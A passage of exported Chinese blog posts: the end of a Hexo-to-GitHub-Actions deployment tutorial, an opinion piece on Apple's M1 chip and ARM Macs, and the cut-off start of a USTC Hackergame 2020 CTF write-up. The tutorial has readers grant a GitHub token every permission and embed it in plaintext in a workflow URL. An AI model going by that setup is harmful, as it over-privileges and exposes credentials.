class=\"headerlink\" title=\"获取 GitHub 令牌\"></a>获取 GitHub 令牌</h2>\n<p>登录你的 GitHub 账号，点击右上角的头像，点击「Settings」进入设置。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/2rxI7G.png\"><p>点击菜单栏中的「Developer settings」进入开发者设置。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/ak0J1J.png\"><p>点击菜单栏中的「Personal access tokens」进入令牌设置。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/ZqiWw8.png\"><p>点击「Generate new token」新建一个令牌。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/JCHxQx.png\"><p>勾选全部的权限，名称随意。</p>\n<p>并点击「Generate token」完成生成。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/6rzspL.png\"><p>记得保存好这个令牌，它不会再次出现。</p>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h2>\n<p>使用 GitHub 新建一个存放 Hexo 文件的仓库，<strong>要选私有仓库</strong>！</p>\n<p><strong>不要勾选</strong>任何的初始化仓库选项！</p>\n<p>在 Hexo 根目录中删除 <code>.git</code> 文件夹(隐藏文件夹)，删除主题目录下的 <code>.git</code> 文件夹。</p>\n<p>然后在 Hexo 根目录下使用 <code>cmd</code> 或终端运行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git init <span class=\"comment\"># 新建 Git 仓库</span></span><br><span class=\"line\">git add -A  <span class=\"comment\"># 暂存所有文件</span></span><br><span class=\"line\">git commit -m <span class=\"string\">\"Create\"</span> <span class=\"comment\"># 提交更新</span></span><br><span class=\"line\">git remote add origin https://github.com/用户名/新建的私有仓库名.git <span class=\"comment\"># 新增远程链接</span></span><br><span class=\"line\">git push -u origin master <span class=\"comment\"># 推送至远程仓库</span></span><br></pre></td></tr></table></figure><hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE-Github-Action\" class=\"headerlink\" title=\"配置 Github Action\"></a>配置 Github Action</h2>\n<p>进入仓库页面，点击「Action」，点击「 set up a workflow yourself 」。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/P5LacM.png\"><p>在左侧代码编辑器中将下方提供的代码粘贴进入代码框。</p>\n<p>请仔细阅读注释，修改最后几行的提交设置。</p>\n<p>确认无误后点击右上角的「Start Commit」。</p>\n<blockquote><p>此处注意！「公开的仓库名」是生成后文件提交的公开仓库，供「GitHub Pages」「Vercel」等服务使用！</p></blockquote>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Deploy</span> <span class=\"comment\"># 部署</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"attr\">on:</span> <span class=\"comment\"># 触发条件</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span> <span class=\"comment\"># 推送到 master 分支</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">    <span class=\"attr\">types:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">published</span> <span class=\"comment\"># 推送新版本号</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span> <span class=\"comment\"># 手动触发</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">build:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span> <span class=\"comment\"># Checkout 仓库</span></span><br><span class=\"line\">      <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"attr\">with:</span></span><br><span class=\"line\">        <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span> <span class=\"comment\"># 安装 Node.js</span></span><br><span class=\"line\">      <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">      <span class=\"attr\">with:</span></span><br><span class=\"line\">        <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">Hexo</span> <span class=\"comment\"># 安装 Hexo</span></span><br><span class=\"line\">      <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">        <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">hexo-cli</span> <span class=\"string\">-g</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Cache</span> <span class=\"string\">Modules</span> <span class=\"comment\"># 缓存 Node 插件</span></span><br><span class=\"line\">      <span class=\"attr\">uses:</span> <span class=\"string\">actions/cache@v1</span></span><br><span class=\"line\">      <span class=\"attr\">id:</span> <span class=\"string\">cache-modules</span></span><br><span class=\"line\">      <span class=\"attr\">with:</span></span><br><span class=\"line\">        <span class=\"attr\">path:</span> <span class=\"string\">node_modules</span></span><br><span class=\"line\">        <span class=\"attr\">key:</span> <span class=\"string\">${{runner.OS}}-${{hashFiles('**/package-lock.json')}}</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">Dependencies</span> <span class=\"comment\"># 如果没有缓存或 插件有更新，则安装插件</span></span><br><span class=\"line\">      <span class=\"attr\">if:</span> <span class=\"string\">steps.cache-modules.outputs.cache-hit</span> <span class=\"type\">!=</span> <span class=\"string\">'true'</span></span><br><span class=\"line\">      <span class=\"attr\">run:</span> <span class=\"string\">|</span> <span class=\"comment\"># 如果仓库里没有 package-lock.json，上传一下，npm ci 必须要有 package-lock.json</span></span><br><span class=\"line\">        <span class=\"string\">npm</span> <span class=\"string\">ci</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Generate</span> <span class=\"comment\"># 生成</span></span><br><span class=\"line\">      <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">        <span class=\"string\">hexo</span> <span class=\"string\">clean</span></span><br><span class=\"line\">        <span class=\"string\">hexo</span> <span class=\"string\">generate</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Deploy</span> <span class=\"comment\"># 部署</span></span><br><span class=\"line\">      <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"HiFun\"</span></span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"omycoke@outlook.com\"</span></span><br><span class=\"line\">        <span class=\"string\">export</span> <span class=\"string\">TZ='Asia/Shanghai'</span></span><br><span class=\"line\">        <span class=\"string\">cd</span> <span class=\"string\">public/</span></span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">init</span></span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Create by workflows\"</span></span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">remote</span> <span class=\"string\">add</span> <span class=\"string\">origin</span> [<span class=\"string\">https://令牌@github.com/用户名/公开的仓库名</span>]</span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span> <span class=\"string\">-f</span></span><br></pre></td></tr></table></figure><img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/n65GGW.png\"><hr>\n<h1>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h1>\n<p>每次更改完文件过后，在 Hexo 根目录运行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git add -A</span><br><span class=\"line\">git commit -m <span class=\"string\">\"Update\"</span></span><br><span class=\"line\">git push origin master</span><br></pre></td></tr></table></figure><p>也可直接在仓库中 改文件/写博文 效果一样，GitHub 都会为你自动生成文件。</p>\n","link":"https://blog.yfun.top/posts/2241387868/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy 